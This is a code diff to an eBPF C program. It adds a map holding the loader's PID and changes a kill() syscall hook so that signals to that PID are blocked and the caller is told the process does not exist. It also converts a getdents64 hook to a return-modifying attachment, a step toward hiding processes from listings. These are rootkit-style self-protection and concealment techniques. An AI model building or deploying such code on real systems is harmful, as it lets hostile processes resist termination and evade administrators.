@@ -6,6 +6,14 @@
 #include <bpf/bpf_tracing.h>
 #include <bpf/bpf_core_read.h>
 
+ // Share my PID with the eBPF program via a map
+struct {
+    __uint(type, BPF_MAP_TYPE_ARRAY);
+    __uint(max_entries, 1);
+    __type(key, __u32);
+    __type(value, __u32);
+} loader_pid SEC(".maps");
+
 // Must always include a license
 char LICENSE[] SEC("license") = "GPL";
 
@@ -22,11 +30,17 @@ int kill_enter(struct pt_regs *ctx)
 
     pid_t pid = (pid_t)di;
     int sig = (int)si;
+    
+    // Read the PID to protect from the map
+    __u32 key = 0;
+    __u32 *blocked_pid_ptr = bpf_map_lookup_elem(&loader_pid, &key);
+    if (!blocked_pid_ptr) {
+        bpf_printk("Couldn't load protected PID from map!");
+        return 0;
+    }
 
-    // bpf_printk("pid=%d sig=%d", pid, sig);
-
-    if (pid == 7909) {
-        bpf_printk("Caught call to protected PID %d", 30749);
+    if (pid == *blocked_pid_ptr) {
+        bpf_printk("Caught call to protected PID %u", *blocked_pid_ptr);
         bpf_override_return(ctx, -ESRCH);
     }
 
@@ -63,10 +77,10 @@ int enter_getdents64(struct pt_regs *ctx)
     return 0;
 }
 
-SEC("kretprobe/__x64_sys_getdents64")
-int exit_getdents64(struct pt_regs *ctx)
+SEC("fmod_ret/__x64_sys_getdents64")
+int exit_getdents64(struct pt_regs *ctx, int ret)
 {
-    long ret = PT_REGS_RC(ctx);
-    bpf_printk("returned %ld", ret);
+    // long ret = PT_REGS_RC(ctx);
+    // bpf_printk("returned %ld", ret);
     return 0;
 }
